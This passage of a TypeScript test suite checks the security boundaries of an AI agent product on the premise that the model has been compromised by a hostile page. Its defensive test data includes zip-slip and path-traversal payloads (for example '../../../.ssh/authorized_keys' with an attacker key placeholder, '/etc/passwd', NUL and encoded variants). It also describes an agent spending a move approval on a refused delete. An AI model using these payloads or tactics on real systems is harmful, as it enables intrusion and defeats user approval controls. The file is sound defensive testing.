import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import JSZip from "jszip";
import { actionDigest, policyDigest, verifyApproval } from "@/lib/work/digests";
import { serializeArtifact, serializeEvent } from "@/lib/work/serializers";
import {
  DeliverableError,
  attachmentDisposition,
  bundlePathProblem,
  isSafeBundlePath,
  sanitizeDeliverableName,
  validateDeliverable,
} from "@/lib/work/deliverables";
import { bundleFiles, buildSite, siteSpecSchema } from "@/lib/work/deliverables/site";
import {
  ALWAYS_CONFIRM_ACTIONS,
  APPROVAL_TTL_MS,
  ARTIFACT_EXTENSION,
  WORK_APPROVAL_DECISIONS,
  WORK_RISK_LEVELS,
  WORK_PERMISSION_POLICIES,
  approvalRuling,
  WORK_TERMINAL_REASONS,
  WORK_TOOL_TIERS,
  allowsScreenshotRelay,
  maxSensitivity,
  permitsTier,
} from "@/lib/work/domain";
import {
  ALWAYS_CONFIRM_ACTIONS as RUNNER_ALWAYS_CONFIRM_ACTIONS,
  APPROVAL_TTL_MS as RUNNER_APPROVAL_TTL_MS,
  WORK_APPROVAL_DECISIONS as RUNNER_APPROVAL_DECISIONS,
  WORK_RISK_LEVELS as RUNNER_RISK_LEVELS,
  WORK_TERMINAL_REASONS as RUNNER_TERMINAL_REASONS,
  WORK_TOOL_TIERS as RUNNER_TOOL_TIERS,
  requiresExplicitApproval,
  approvalAsksUnder,
  WORK_PERMISSION_POLICIES as RUNNER_PERMISSION_POLICIES,
} from "../runner/agent-core/src/work/types.js";
import { evaluateTier } from "../runner/agent-core/src/work/tier.js";

/*
 * The boundaries a fully compromised Work run must still not cross.
 *
 * The assumption behind every test here is the pessimistic one: the model has
 * read a hostile page, believes it, and is now trying its best to act on it.
 * Nothing in this file asks whether it can be talked out of that — that is
 * work-threats.test.ts, and the answer there is "not reliably". What is asked
 * here is whether the structural boundaries hold anyway.
 *
 * Six of them, one section each:
 *
 *   1. an approval is a promise about one exact action and cannot be spent on
 *      another, nor survive the policy change aimed at it;
 *   2. no route reads a user identity from anything the caller controls;
 *   3. the tool hierarchy cannot be climbed by declaring a tier nobody knows;
 *   4. a classification only ever rises, and `restricted` never relays;
 *   5. a column that has no business leaving the server does not leave it;
 *   6. a path Juno writes cannot climb out of the directory it is written into.
 *
 * No database, no network, no host. Every section but 2 runs against the real
 * functions; section 2 is a source-level assertion and says at its head why it
 * has to be one.
 */

// ---------------------------------------------------------------------------
// 1. An approval is a promise about one exact thing
// ---------------------------------------------------------------------------

const PERMISSIVE = { policy: "permissive", session: "permissive", host: "balanced" };
const CONSERVATIVE = { policy: "conservative", session: "conservative", host: "conservative" };
const NOW = new Date("2026-08-05T12:00:00.000Z");
const EXPIRES = new Date(NOW.getTime() + APPROVAL_TTL_MS);

/** The card the user actually saw: fourteen files moved out of Downloads. */
const SHOWN_ACTION = "work.file.batch_move";
const SHOWN_DETAIL = { from: "Downloads", to: "Archive", count: 14 };

function asApproved(overrides: Partial<Parameters<typeof verifyApproval>[0]> = {}) {
  return verifyApproval({
    storedDigest: actionDigest(SHOWN_ACTION, SHOWN_DETAIL),
    storedPolicyDigest: policyDigest(PERMISSIVE),
    action: SHOWN_ACTION,
    detail: SHOWN_DETAIL,
    policy: PERMISSIVE,
    decision: "allowed",
    expiresAt: EXPIRES,
    now: NOW,
    ...overrides,
  });
}

test("an approval for a move cannot be spent on the delete that was refused", () => {
  // The attack in full: the run asks to permanently delete, is refused, asks to
  // move instead, is allowed — and then carries out the delete under the
  // approval it has in hand. Only the digest notices, because the approval row
  // itself says nothing except "allowed".
  assert.deepEqual(asApproved({ action: "work.file.permanent_delete" }), {
    ok: false,
    reason: "digest_mismatch",
  });

  // And the substituted action is one that could never have been carried out
  // silently in the first place: it is on the always-confirm list, so it needed
  // a card of its own whatever the run's risk assessment said.
  assert.equal(requiresExplicitApproval("work.file.permanent_delete", "safe"), true);
});

test("the same action against a changed target is a different action", () => {
  // `detail` is not decoration. A move whose destination was rewritten between
  // the card and the execution is a move the user never agreed to, and the
  // digest is the only thing in the system that can tell the two apart.
  assert.deepEqual(
    asApproved({ detail: { ...SHOWN_DETAIL, to: "/Volumes/Shared" } }),
    { ok: false, reason: "digest_mismatch" }
  );
});

test("a standing always-allow does not survive the narrowing aimed at it", () => {
  // `allowed_always` is the answer that reads most like a token: the user said
  // yes to this kind of thing, so the run stops asking. If it also outlived a
  // policy change it would be exactly that — a bearer token for one action,
  // immune to the one control the user has for taking it back.
  assert.deepEqual(
    asApproved({ decision: "allowed_always", policy: CONSERVATIVE }),
    { ok: false, reason: "policy_changed" }
  );
  // Unchanged policy, same answer: still good, so the narrowing above is doing
  // the refusing rather than `allowed_always` being rejected on principle.
  assert.deepEqual(asApproved({ decision: "allowed_always" }), { ok: true });
});

test("verifyApproval is a predicate, not a nonce", () => {
  // Worth stating outright because the name invites the opposite reading. The
  // function answers "is this action the approved one, under the policy in
  // force, inside the window" — and that answer does not change by being asked
  // twice, so nothing here stops one approval authorising two executions of the
  // same action. Single use comes from the row: the decision route updates
  // `where: { id, userId, decision: "pending" }`, and a second attempt matches
  // nothing. A caller that consults only this function has no replay protection
  // at all.
  assert.deepEqual(asApproved(), { ok: true });
  assert.deepEqual(asApproved(), { ok: true });
});

test("the digest binds the action, never the account that approved it", () => {
  // Two people asking for the same tidy-up produce byte-identical digests, so a
  // digest lifted from one account's approval satisfies the check in another.
  // That is not a flaw in the digest — binding it to a user would break the
  // recomputation the executor does on a different host — but it does mean the
  // account boundary rests entirely on the `userId`-scoped row lookup that
  // section 2 pins. The two tests are load-bearing together and neither is on
  // its own.
  const mine = actionDigest(SHOWN_ACTION, SHOWN_DETAIL);
  const theirs = actionDigest(SHOWN_ACTION, { ...SHOWN_DETAIL });
  assert.equal(mine, theirs);
  assert.deepEqual(asApproved({ storedDigest: theirs }), { ok: true });
});

// ---------------------------------------------------------------------------
// 2. No Work route reads a user identity from the request
// ---------------------------------------------------------------------------

/*
 * This section is static, and deliberately so.
 *
 * The boundary it checks is a `where` clause inside a Next route handler.
 * Exercising it behaviourally needs a request context, a session cookie and a
 * live Postgres with two seeded accounts — which is why, in practice, nothing
 * exercises it, and a handler that forgot `userId` would ship. Reading it needs
 * none of those, and the failure mode is entirely visible in the text: a query
 * whose `where` names only the row id returns another account's session to
 * whoever guesses the id.
 *
 * The file list comes from disk rather than from a constant, so a route added
 * next quarter is covered the day it lands instead of the day somebody
 * remembers this file exists.
 */

const WORK_API_DIR = fileURLToPath(new URL("../src/app/api/work", import.meta.url));

const ROUTE_FILES: string[] = readdirSync(WORK_API_DIR, { recursive: true })
  .map((entry) => String(entry))
  .filter((entry) => entry.endsWith("route.ts"))
  .sort();

function routeSource(relative: string): string {
  return stripComments(readFileSync(join(WORK_API_DIR, relative), "utf8"));
}

/**
 * Removes comments before anything else looks at the source.
 *
 * The scanner reasons about bindings, and a comment is not one. Leaving them in
 * cuts both ways and both ways are wrong: a comment quoting the correct pattern
 * makes an unscoped query look scoped, and a comment quoting an incorrect one
 * fails a file whose code is fine. The second is what actually happened — a
 * comment explaining why a helper takes the whole user rather than an id had to
 * name the shape it was arguing for, and naming it tripped the check.
 *
 * Replaced with spaces rather than deleted so every offset the brace matcher
 * computes still lines up with the original text.
 */
function stripComments(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\/|\/\/[^\n]*/g, (match) =>
    match.replace(/[^\n]/g, " ")
  );
}

/** The index of the brace that closes the one at `open`. */
function matchingBrace(source: string, open: number): number {
  let depth = 0;
  for (let cursor = open; cursor < source.length; cursor++) {
    if (source[cursor] === "{") depth += 1;
    else if (source[cursor] === "}" && --depth === 0) return cursor;
  }
  return source.length - 1;
}

interface WhereClause {
  /** The clause as written: an object literal, or the name of one. */
  text: string;
  /** Where it starts, so a declaration can be looked for ahead of it. */
  at: number;
}

/**
 * Every `where:` in a source file, brace-matched.
 *
 * A regex cannot do this: the interesting clauses are the ones with a nested
 * object in them (`seq: { gt: cursor }`, `status: { in: [...] }`), and a
 * non-greedy match stops at the first inner brace — which is exactly where the
 * `userId` this test is looking for tends to sit. The identifier form
 * (`where: claimable`) is collected too, because a scope that lives in a named
 * constant is still a scope and skipping it would silently exempt it.
 */
function whereClauses(source: string): WhereClause[] {
  const found: WhereClause[] = [];
  for (const marker of source.matchAll(/where:\s*(\{|[A-Za-z_$][A-Za-z0-9_$]*)/g)) {
    const at = marker.index;
    if (marker[1] !== "{") {
      found.push({ text: marker[1], at });
      continue;
    }
    const open = source.indexOf("{", at);
    found.push({ text: source.slice(at, matchingBrace(source, open) + 1), at });
  }
  return found;
}

/**
 * The initialiser of `const <name> = …`, brace-matched when it opens an object.
 *
 * Used to follow a `where` clause back to whatever bound the value it keys on.
 * Deliberately the nearest declaration before the use, so a name reused across
 * two handlers in one file resolves to the one actually in scope.
 */
function initialiserOf(source: string, name: string, before: number): string | null {
  let declaration = -1;
  // A word boundary rather than `const ${name} `, because a typed constant is
  // written `const claimable: Prisma.WorkCommandWhereInput = {` with no space
  // after the name, and missing it would exempt exactly the clauses that keep
  // their scope in a named constant.
  for (const found of source.slice(0, before).matchAll(new RegExp(`\\bconst ${name}\\b`, "g"))) {
    declaration = found.index;
  }
  if (declaration === -1) return null;
  const open = source.indexOf("{", declaration);
  const statement = source.indexOf(";", declaration);
  if (open === -1 || (statement !== -1 && statement < open)) {
    return source.slice(declaration, statement === -1 ? source.length : statement);
  }
  return source.slice(declaration, matchingBrace(source, open) + 1);
}

test("there are Work route modules to check, and they were found on disk", () => {
  // Guards the rest of the section: a directory rename turns every assertion
  // below into a loop over nothing, which passes and proves nothing.
  assert.ok(ROUTE_FILES.length >= 8, `found only ${ROUTE_FILES.length} route modules`);
  assert.ok(ROUTE_FILES.includes("sessions/route.ts"));
  assert.ok(ROUTE_FILES.includes("approvals/[id]/decision/route.ts"));
});

test("every Work route resolves the caller from the session before it reads a row", () => {
  for (const file of ROUTE_FILES) {
    const source = routeSource(file);
    assert.match(
      source,
      /import \{ requireUser \} from "@\/lib\/code-remote";/,
      `${file} does not import the session guard`
    );

    // One segment per exported handler. Index 0 is the module preamble, which
    // has no handler in it.
    const handlers = source.split("export async function ").slice(1);
    assert.ok(handlers.length > 0, `${file} exports no handler`);

    for (const handler of handlers) {
      const name = handler.slice(0, handler.indexOf("("));
      const guard = handler.indexOf("await requireUser()");
      const query = handler.indexOf("prisma.");
      assert.notEqual(guard, -1, `${file} ${name} never calls requireUser`);
      assert.match(
        handler.slice(guard, guard + 120),
        /if \(!user\) return error;/,
        `${file} ${name} calls requireUser without acting on a failure`
      );
      assert.ok(
        query === -1 || guard < query,
        `${file} ${name} touches the database before it knows who is asking`
      );
    }
  }
});

const SCOPED = /userId: user\.id/;

/**
 * Whether one `where` clause is bound to the session user, directly or through
 * a row that already was.
 *
 * Three shapes in the tree legitimately omit `userId` from the clause itself,
 * and all three are the same shape underneath — the scope is one step away
 * rather than absent:
 *
 *   - the clause is a named constant (`where: claimable`) whose object carries
 *     it, or spreads that constant into a narrower query;
 *   - the row has no owner column of its own (`WorkSkillVersion`) and is
 *     reached through a head row matched on `userId`;
 *   - the clause keys on a column unique account-wide (`WorkHost.deviceId`)
 *     whose value came from an owner-checked lookup.
 *
 * So this follows the value back rather than exempting files by name. The
 * distinction that matters: `where: { deviceId: device.id }` is safe because
 * `device` came out of a query naming `userId: user.id`, and
 * `where: { deviceId: body.deviceId }` names the identical column and is not.
 */
function scopedToSessionUser(source: string, clause: WhereClause): boolean {
  if (SCOPED.test(clause.text)) return true;

  // `where: claimable` — the scope lives in the constant.
  if (!clause.text.startsWith("{") && !clause.text.startsWith("where:")) {
    const initialiser = initialiserOf(source, clause.text, clause.at);
    return initialiser !== null && SCOPED.test(initialiser);
  }

  // `where: { ...claimable, id: candidate.id }` — one scoped spread is enough,
  // because Prisma ANDs the keys and a narrower clause over a scoped one cannot
  // widen it.
  for (const spread of clause.text.matchAll(/\.\.\.([A-Za-z_$][A-Za-z0-9_$]*)/g)) {
    const initialiser = initialiserOf(source, spread[1], clause.at);
    if (initialiser !== null && SCOPED.test(initialiser)) return true;
  }

  // Otherwise every identifier the clause keys on has to have come out of a
  // query that named the session user.
  const bindings = new Set(
    [...clause.text.matchAll(/\b([a-z][A-Za-z0-9_]*)\.[A-Za-z0-9_]+/g)].map((use) => use[1])
  );
  if (bindings.size === 0) return false;
  return [...bindings].every((binding) => {
    const initialiser = initialiserOf(source, binding, clause.at);
    return initialiser !== null && initialiser.includes("await prisma.") && SCOPED.test(initialiser);
  });
}

test("every Prisma query in a Work route is scoped to the session user", () => {
  let checked = 0;
  let indirect = 0;
  for (const file of ROUTE_FILES) {
    const source = routeSource(file);
    for (const clause of whereClauses(source)) {
      checked += 1;
      if (SCOPED.test(clause.text)) continue;
      assert.ok(
        scopedToSessionUser(source, clause),
        `${file} has a query scoped neither by userId nor through a value already matched on it, ` +
          `which returns another account's data to whoever guesses an id: ${clause.text}`
      );
      indirect += 1;
    }
  }
  assert.ok(checked >= 25, `only ${checked} where clauses were inspected`);
  // Both counts are asserted so neither half of the rule can quietly stop
  // applying: zero indirect clauses would mean the branch above is dead code
  // and nobody would notice it had rotted.
  assert.ok(indirect >= 1, "the indirect-ownership branch matched nothing");
});

test("no Work route takes an account from anything the caller controls", () => {
  for (const file of ROUTE_FILES) {
    const source = routeSource(file);

    // The concrete substitutions: a body field, a path parameter, a query
    // string, a header. Each would let a caller name the account whose rows are
    // read, which is the whole of the attack.
    assert.doesNotMatch(source, /\bbody\.userId\b/, `${file} reads userId from the body`);
    assert.doesNotMatch(source, /\bparsed\.data\.userId\b/, `${file} reads userId from the parsed body`);
    assert.doesNotMatch(source, /\bparams\.userId\b/, `${file} reads userId from the path`);
    assert.doesNotMatch(
      source,
      /searchParams\.get\(\s*["'`]userId/,
      `${file} reads userId from the query string`
    );
    assert.doesNotMatch(
      source,
      /headers\.get\(\s*["'`][^"'`]*user[^"'`]*["'`]/i,
      `${file} reads a user identity from a request header`
    );

    // And every binding of the column itself resolves to the session user.
    // Three forms are accepted and nothing else:
    //
    //   `user.id`         — the session user, which is the whole rule;
    //   `string`          — a type annotation on a local helper's parameter,
    //                       not a value at all;
    //   `<local>.userId`  — a helper forwarding the subject it was handed. Safe
    //                       by closure rather than by inspection: the call site
    //                       that populates it is itself a `userId:` binding in
    //                       this same file, so an account taken from the
    //                       request would have to appear as one of these
    //                       bindings and would be caught on that line. The
    //                       request-shaped names are excluded outright anyway.
    for (const binding of source.matchAll(/\buserId\s*:\s*[^,;\n)}]+/g)) {
      const text = binding[0].trim();
      const value = text.slice("userId:".length).trim();
      assert.ok(
        value === "user.id" ||
          /^string(\s*\|\s*null)?$/.test(value) ||
          /^(?!body|parsed|params|req|request|searchParams|json|payload)[A-Za-z_$][A-Za-z0-9_$]*\.userId$/.test(
            value
          ),
        `${file} binds userId to something other than the session user: ${text}`
      );
    }
  }
});

test("the one helper that takes a userId is only ever handed the session user's", () => {
  const source = routeSource("sessions/route.ts");
  assert.match(
    source,
    /function idempotentSessionId\(userId: string, key: string\): string \{/,
    "the helper this exception exists for is gone; drop the exception above"
  );
  // Called with anything else, the derived id would be another account's — and
  // the lookup that follows is keyed on it.
  const calls = [...source.matchAll(/idempotentSessionId\(([^)]*)\)/g)]
    .map((call) => call[1].trim())
    .filter((argument) => argument !== "userId: string, key: string");
  assert.ok(calls.length > 0, "the helper is declared but never called");
  for (const call of calls) {
    assert.match(call, /^user\.id,/, `idempotentSessionId called with ${call}`);
  }
});

test("the request schemas have no field a client could put an account in", () => {
  // The schemas strip unknown keys, so a `userId` in the body is dropped before
  // a handler could read it even by accident. That only holds while no schema
  // declares one.
  const protocol = readFileSync(new URL("../src/app/api/work/protocol.ts", import.meta.url), "utf8");
  assert.doesNotMatch(protocol, /\buserId\b/, "a request schema now accepts a userId");
});

// ---------------------------------------------------------------------------
// 3. The tool hierarchy cannot be climbed
// ---------------------------------------------------------------------------

test("permitsTier alone lets an unranked tool through, which is why evaluateTier exists", () => {
  // `toolTier` answers MAX_SAFE_INTEGER for a name it does not know, and
  // `permitsTier` compares with `<=`. So an unknown tool measured against other
  // unknown tools — or against no candidates at all — compares equal and is
  // permitted. A run that wants the shell and declares an intent nothing else
  // serves would be handed it.
  assert.equal(permitsTier("shell", []), true);
  assert.equal(permitsTier("made_up_tier", ["another_made_up_tier"]), true);

  // The predicate is a comparison, not the gate. `evaluateTier` is the gate, and
  // it refuses both shapes by name before the comparison is ever reached.
  const undeclared = evaluateTier({ intent: "email.archive", chosen: "shell", candidates: [] });
  assert.equal(undeclared.allowed, false);
  assert.match(undeclared.reason, /has not declared that it can serve/);

  const unranked = evaluateTier({
    intent: "email.archive",
    chosen: "mystery",
    // The cast is the attack: a tool declaring a tier id the table has never
    // heard of. Nothing at runtime narrows this field, so the refusal below is
    // the only thing between it and the run.
    candidates: [{ tool: "mystery", tier: "privileged" as never, healthy: true }],
  });
  assert.equal(unranked.allowed, false);
  assert.match(unranked.reason, /is not on any tier of the tool hierarchy/);
  assert.equal(unranked.allowed === false && unranked.audit.kind, "tier_downgrade_refused");
});

test("a screen click is refused while a connector is healthy, and permitted once it is not", () => {
  const candidates = [
    { tool: "gmail__archive", tier: "connector" as const, healthy: true },
    { tool: "screen__click", tier: "visual" as const, healthy: true },
  ];

  // The refusal names the tool to use instead, because "denied" on its own is
  // something a model can only respond to by trying again the same way.
  const refused = evaluateTier({ intent: "email.archive", chosen: "screen__click", candidates });
  assert.equal(refused.allowed, false);
  assert.equal(refused.allowed === false && refused.better?.tool, "gmail__archive");

  // An expired connector token must not strand the run: the rule is a hierarchy,
  // not a prohibition, and a rule that leaves the user unable to do the work is
  // a rule that gets switched off.
  const degraded = evaluateTier({
    intent: "email.archive",
    chosen: "screen__click",
    candidates: [{ ...candidates[0], healthy: false }, candidates[1]],
  });
  assert.equal(degraded.allowed, true);
  assert.match(degraded.reason, /gmail__archive would rank higher but is unavailable/);
});

test("the always-confirm list is matched exactly, never by resemblance", () => {
  // Matched through the runner's mirrored copy, which is the one an executor
  // consults. Each variant below is a plausible way an action name arrives
  // slightly wrong — trimmed differently, cased differently, namespaced by a
  // caller, or suffixed by a tool that thinks it is being more specific — and
  // every one of them must fail to match rather than fuzzily match, because a
  // fuzzy match here would confirm actions nobody meant to gate and train the
  // user to tap through the cards.
  assert.equal(requiresExplicitApproval("work.connector.send_message", "safe"), true);
  for (const nearMiss of [
    "work.connector.send_message ",
    " work.connector.send_message",
    "Work.Connector.Send_Message",
    "work.connector.send_message2",
    "juno.work.connector.send_message",
    "work.connector.send_messages",
  ]) {
    assert.equal(
      requiresExplicitApproval(nearMiss, "safe"),
      false,
      `${JSON.stringify(nearMiss)} matched the list by resemblance`
    );
  }

  // Risk is the other door into the same gate, and it is not defeated by an
  // action name nobody recognises.
  assert.equal(requiresExplicitApproval("work.something.brand_new", "irreversible"), true);
  assert.equal(requiresExplicitApproval("work.something.brand_new", "sensitive"), true);
});

test("the runner's mirror of the domain vocabulary has not drifted", () => {
  // runner/agent-core is built standalone and cannot import from src/, so
  // work/types.ts holds a hand-copied duplicate of domain.ts. Drift there is not
  // cosmetic: an action missing from the runner's copy of the confirm list is an
  // action the executor performs without a card while the server still believes
  // it is gated, and nothing in either half would report the disagreement.
  assert.deepEqual([...RUNNER_ALWAYS_CONFIRM_ACTIONS], [...ALWAYS_CONFIRM_ACTIONS]);
  assert.deepEqual([...RUNNER_TOOL_TIERS], [...WORK_TOOL_TIERS]);
  assert.deepEqual([...RUNNER_TERMINAL_REASONS], [...WORK_TERMINAL_REASONS]);
  assert.deepEqual([...RUNNER_RISK_LEVELS], [...WORK_RISK_LEVELS]);
  assert.deepEqual([...RUNNER_APPROVAL_DECISIONS], [...WORK_APPROVAL_DECISIONS]);
  assert.equal(RUNNER_APPROVAL_TTL_MS, APPROVAL_TTL_MS);
});

// ---------------------------------------------------------------------------
// 4. Classification only ever rises
// ---------------------------------------------------------------------------

test("one restricted item poisons the whole set, wherever it sits", () => {
  // The realistic shape of the mistake: a run reads four public pages and one
  // restricted document, then screenshots the window showing all five. Judging
  // the relay on the last item read, or on the first, permits it.
  assert.equal(maxSensitivity("public", "public", "restricted", "internal"), "restricted");
  assert.equal(maxSensitivity("restricted", "public"), "restricted");
  assert.equal(allowsScreenshotRelay(maxSensitivity("public", "restricted")), false);

  // Everything below restricted may relay, so the rule is a ceiling rather than
  // a blanket refusal that would make the Mac unusable.
  for (const sensitivity of ["public", "internal", "confidential"] as const) {
    assert.equal(allowsScreenshotRelay(sensitivity), true);
  }
  assert.equal(allowsScreenshotRelay("restricted"), false);
});

test("an unclassified set resolves to public, so classifying is the caller's job", () => {
  // Recorded rather than celebrated. `maxSensitivity` folds absent values away
  // so a partially annotated set is not dragged up to restricted by the gaps —
  // but the consequence is that a set with no classification at all comes back
  // `public` and relays. Anything that captures a screen has to establish the
  // classification itself; this function will not fail closed on its behalf.
  assert.equal(maxSensitivity(), "public");
  assert.equal(maxSensitivity(undefined, null), "public");
  assert.equal(allowsScreenshotRelay(maxSensitivity(undefined, "confidential")), true);
});

// ---------------------------------------------------------------------------
// 5. Columns that must not leave the server
// ---------------------------------------------------------------------------

/*
 * tests/work-grant-paths.test.ts covers the grant and command serialisers, which
 * are where a local path escapes. The artifact serialiser is the same class of
 * boundary and nothing tested it: the row carries the account, the soft-delete
 * marker, and — through the version it fronts — an object-storage key. A key is
 * not a path on the user's disk, but it names a bucket object directly and is
 * the one field a client could take somewhere else and try.
 */

const ARTIFACT = {
  id: "wart_1",
  sessionId: "wsess_1",
  userId: "user_1",
  identifier: "q3-report",
  title: "Q3 report",
  kind: "document",
  mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  currentVersion: 3,
  validatedAt: new Date("2026-08-05T11:00:00.000Z"),
  createdAt: new Date("2026-08-01T09:00:00.000Z"),
  updatedAt: new Date("2026-08-05T10:59:00.000Z"),
  deletedAt: null,
  // Not a column on WorkArtifact today. It stands in for the version field a
  // future `include` would join onto this row, which is exactly how a storage
  // key reaches a serialiser that spreads.
  storageKey: "work/user_1/wart_1/v3.docx",
} as unknown as Parameters<typeof serializeArtifact>[0];

test("the artifact shape names every field, so an account and a storage key stay behind", () => {
  const client = serializeArtifact(ARTIFACT);
  assert.deepEqual(
    Object.keys(client).sort(),
    [
      "createdAt",
      "currentVersion",
      "id",
      "identifier",
      "kind",
      "mimeType",
      "sessionId",
      "title",
      "updatedAt",
      "validatedAt",
    ],
    "a field appearing here that nobody added on purpose is the bug this test exists for"
  );

  const serialised = JSON.stringify(client);
  assert.doesNotMatch(serialised, /user_1/, `the owning account reached a client: ${serialised}`);
  assert.doesNotMatch(serialised, /storageKey|\.docx/, `a storage key reached a client: ${serialised}`);
});

test("an artifact kind this build cannot read is a bundle, not a passthrough", () => {
  // `oneOf` narrows to a member of the vocabulary. Echoing the stored string
  // instead would put an unvalidated value into `kind`, which the clients switch
  // on to choose a viewer and an export path.
  const odd = serializeArtifact({ ...ARTIFACT, kind: "executable" } as typeof ARTIFACT);
  assert.equal(odd.kind, "bundle");
});

test("an event whose stored visibility is unreadable is internal, never user-visible", () => {
  // The failure this prevents: a row written by an older or a compromised
  // producer carries a visibility nobody can classify, and a client that treats
  // "not internal" as "showable" renders it. Defaulting the other way makes an
  // unclassified event a bug someone reports rather than a disclosure nobody
  // notices.
  const event = {
    id: "wev_1",
    runId: "wrun_1",
    seq: 4,
    kind: "tool_finished",
    payloadVersion: 1,
    visibility: "public",
    payload: { tool: "gmail__archive" },
    eventKey: "wrun_1:4",
    agentId: null,
    createdAt: new Date("2026-08-05T12:00:00.000Z"),
  } as unknown as Parameters<typeof serializeEvent>[0];

  assert.equal(serializeEvent(event).visibility, "internal");
  // And an unreadable kind becomes `error` rather than an invented name, so no
  // client is asked to render an event it has no case for.
  assert.equal(
    serializeEvent({ ...event, kind: "exfiltrated" } as typeof event).kind,
    "error"
  );
});

// ---------------------------------------------------------------------------
// 6. A path Juno writes cannot climb out of the directory it is written into
// ---------------------------------------------------------------------------

/*
 * The other half of the path threat, and a different attack from the Swift one.
 *
 * A `GrantedPath` is a path the user picked on a machine Juno is standing on,
 * and containment there is `realpath(3)` plus a prefix test — the symlink
 * boundary in WorkspaceAccess, with its own suite next to it. Restating that in
 * TypeScript would assert nothing about this repository, and
 * tests/work-grant-paths.test.ts already pins the only TypeScript-side claim
 * about those paths, which is that the remote serialisers never emit one.
 *
 * What is left uncovered is the path Juno *writes*. A bundle entry name is not
 * a path on this machine at all: it is a path on whoever unzips the archive,
 * days later, with an extractor nobody here chose. `../../../.ssh/authorized_keys`
 * as an entry name is written by a naive extractor to exactly that location
 * relative to the extraction directory, which is to say outside it — the attack
 * usually called zip-slip. So the escape is checked at the name, before any
 * filesystem is involved, and it is checked twice: once when the entry is added
 * and once when the finished archive is read back.
 */

/** Legitimate names, so the rule is a filter rather than a prohibition. */
const SAFE_ENTRIES = ["index.html", "styles.css", "assets/logo.png", "docs/2026/q3.html"];

test("a bundle entry cannot climb out of the bundle, wherever the dots sit", () => {
  // Every position `..` can occupy, because a check written against the leading
  // case only — the one everybody thinks of — passes `assets/../../etc/passwd`
  // straight through.
  const escapes = [
    "..",
    "../evil.sh",
    "../../../etc/passwd",
    "assets/../../../.ssh/authorized_keys",
    "docs/..",
    "docs/../../evil.sh",
    // Refused even though it resolves back inside. The rule judges the name and
    // not the resolved result on purpose: resolution is the extractor's, and an
    // extractor that resolves differently from this test is exactly the case
    // the rule exists for. Nothing Juno generates needs to say `..` anyway.
    "assets/../logo.png",
    // `.` is dots-only too, and `./index.html` and `index.html` are two entries
    // in the archive and one file on disk.
    "./index.html",
    "a/./b.html",
    // Not two dots but three, which is a real directory name on no filesystem
    // and a traversal on some extractors.
    ".../evil.sh",
  ];

  // Matched exactly rather than loosely, because "refused" is not the claim.
  // Several of these would also trip the segment-shape rule if the traversal
  // rule were deleted — `...` is not a plain relative file name either — and a
  // test satisfied by any refusal would keep passing with the escape check
  // gone. The exact message pins which rule fired.
  for (const path of escapes) {
    const problem = bundlePathProblem(path);
    assert.equal(
      problem,
      `Entry name would escape the bundle directory: ${path}`,
      `${JSON.stringify(path)} was not refused as an escape`
    );
    assert.equal(isSafeBundlePath(path), false);
  }

  for (const path of SAFE_ENTRIES) {
    assert.equal(bundlePathProblem(path), null, `${path} was refused and should not have been`);
  }
});

test("the traversals that only work on somebody else's filesystem are refused too", () => {
  // Each of these is a way to leave the extraction directory without writing
  // `..` at all, and each is refused by a rule of its own rather than by a
  // catch-all — so the message tells whoever reads it which one fired.
  const refusals: ReadonlyArray<[string, RegExp, string]> = [
    [
      "..\\..\\evil.bat",
      /contains a backslash/,
      "a Windows extractor reads this as traversal and a POSIX one as one oddly-named file",
    ],
    ["/etc/cron.d/evil", /is absolute/, "an absolute name ignores the extraction directory entirely"],
    [
      "C:/Windows/System32/evil.dll",
      /carries a drive letter/,
      "a drive letter leaves the extraction directory without a single dot",
    ],
    [
      "assets//logo.png",
      /has an empty path segment/,
      "an empty segment is a leading slash in the middle of a name",
    ],
    [
      "index.html\u0000.png",
      /contains a control character/,
      "a NUL truncates the name in any C extractor, so what is written is not what was checked",
    ],
    [
      "..%2f..%2fetc%2fpasswd",
      /is not a plain relative file name/,
      "percent-encoding survives a checker that decodes and an extractor that does not, or the reverse",
    ],
    [
      "\uff0e\uff0e/evil.sh",
      /is not a plain relative file name/,
      "fullwidth dots, which normalise to `..` on a filesystem that folds them",
    ],
    [
      ".ssh/authorized_keys",
      /is not a plain relative file name/,
      "a dotted directory: no traversal, but it lands somewhere nobody looks",
    ],
    [
      "a/b/c/d/e/f/g/h/i.html",
      /nests deeper than 8 directories/,
      "depth is an archive-bomb bound rather than an aesthetic one",
    ],
    [`${"a".repeat(200)}.html`, /is longer than 180 characters/, "and so is length"],
  ];

  for (const [path, reason, why] of refusals) {
    const problem = bundlePathProblem(path);
    assert.notEqual(problem, null, `${JSON.stringify(path)} was permitted — ${why}`);
    assert.match(problem ?? "", reason, `${JSON.stringify(path)}: ${why}`);
  }

  // A name that is not a string at all is refused rather than coerced: the spec
  // arrives as JSON, and `null` stringifies to the perfectly safe-looking
  // "null" if anything on the way decides to be helpful.
  for (const notAName of [null, undefined, 42, {}, ["index.html"], ""]) {
    assert.equal(isSafeBundlePath(notAName), false, `${JSON.stringify(notAName)} passed as a name`);
  }
});

test("the schema accepts the traversal, and the bundler is what refuses it", async () => {
  // Worth stating outright, because every other request in this tree is gated by
  // a zod schema and it is easy to assume this one is too. `sitePageSchema.path`
  // is `z.string().trim().min(1).max(180)` and nothing more, so validation
  // succeeds on a page path that leaves the bundle. The builder is the boundary,
  // and it is the only boundary.
  const parsed = siteSpecSchema.safeParse({
    kind: "site",
    title: "Quarterly summary",
    pages: [
      { path: "index.html", title: "Summary", blocks: [{ type: "paragraph", text: "Revenue held." }] },
      {
        path: "../../../.ssh/authorized_keys",
        title: "Appendix",
        blocks: [{ type: "paragraph", text: "ssh-rsa AAAA… attacker@example.invalid" }],
      },
    ],
  });
  assert.equal(parsed.success, true, "the schema was tightened; rewrite this test rather than deleting it");
  if (!parsed.success) return;
  assert.equal(parsed.data.pages[1].path, "../../../.ssh/authorized_keys", "the schema repaired the path");

  const unsafePath = (err: unknown): boolean =>
    err instanceof DeliverableError &&
    err.code === "unsafe_path" &&
    /would escape the bundle directory/.test(err.message);

  await assert.rejects(() => buildSite(parsed.data), unsafePath);
  // And the same refusal one layer down, so a future generator that assembles
  // its own entries is covered by the check rather than by buildSite's caution.
  await assert.rejects(
    () => bundleFiles([{ path: "index.html", content: "<h1>ok</h1>" }, { path: "../../evil.sh", content: "#!/bin/sh\n" }]),
